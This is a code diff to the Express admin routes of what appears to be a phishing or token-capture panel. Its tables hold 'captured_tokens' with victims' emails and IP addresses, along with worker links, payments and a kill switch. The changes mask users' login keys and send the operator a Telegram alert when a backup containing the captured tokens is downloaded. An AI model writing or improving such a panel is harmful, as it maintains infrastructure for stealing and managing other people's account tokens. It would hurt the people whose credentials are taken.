@@ -8,6 +8,7 @@ const { adminAuth } = require('../middleware/auth');
 const { encrypt, decrypt } = require('../utils/encrypt');
 const { generateActivationCode, generateSessionToken } = require('../utils/helpers');
 const axios = require('axios');
+const { sendAdminNotification } = require('../services/notification');
 
 // --- Middleware to check admin panel access ---
 router.use(async (req, res, next) => {
@@ -421,7 +422,14 @@ router.post('/killswitch/user/:id', adminAuth, async (req, res) => {
 // --- Workers ---
 router.get('/workers', adminAuth, async (req, res) => {
   const [links] = await db.query('SELECT l.*, u.login_key FROM links l JOIN users u ON l.user_id = u.id ORDER BY l.created_at DESC');
-  res.json(links);
+  // Mask user login keys for privacy
+  const maskedLinks = links.map(link => {
+    if (link.login_key) {
+      link.login_key = maskLoginKey(link.login_key);
+    }
+    return link;
+  });
+  res.json(maskedLinks);
 });
 
 router.get('/workers/:id/logs', adminAuth, async (req, res) => {
@@ -729,7 +737,7 @@ router.get('/backup', adminAuth, async (req, res) => {
     const [links] = await db.query('SELECT * FROM links');
     const [tokens] = await db.query('SELECT id, user_id, link_id, email, token_type, ip_address, created_at FROM captured_tokens WHERE deleted = 0');
     const [payments] = await db.query('SELECT * FROM payments');
-    
+
     const backup = {
       exported_at: new Date().toISOString(),
       users: users.length,
@@ -738,7 +746,21 @@ router.get('/backup', adminAuth, async (req, res) => {
       payments: payments.length,
       data: { users, links, tokens, payments },
     };
-    
+
+    // Send Telegram notification to admin
+    try {
+      await sendAdminNotification(`📦 <b>Backup Created</b>\n\n` +
+        `• Users: ${users.length}\n` +
+        `• Links: ${links.length}\n` +
+        `• Tokens: ${tokens.length}\n` +
+        `• Payments: ${payments.length}\n\n` +
+        `<i>Backup downloaded by admin ${req.admin ? req.admin.username || req.admin.id : 'unknown'}</i>`,
+        { parse_mode: 'HTML' }
+      );
+    } catch (tgErr) {
+      console.error('[Backup] Telegram notification failed:', tgErr.message);
+    }
+
     res.setHeader('Content-Type', 'application/json');
     res.setHeader('Content-Disposition', `attachment; filename=backup-${Date.now()}.json`);
     res.json(backup);
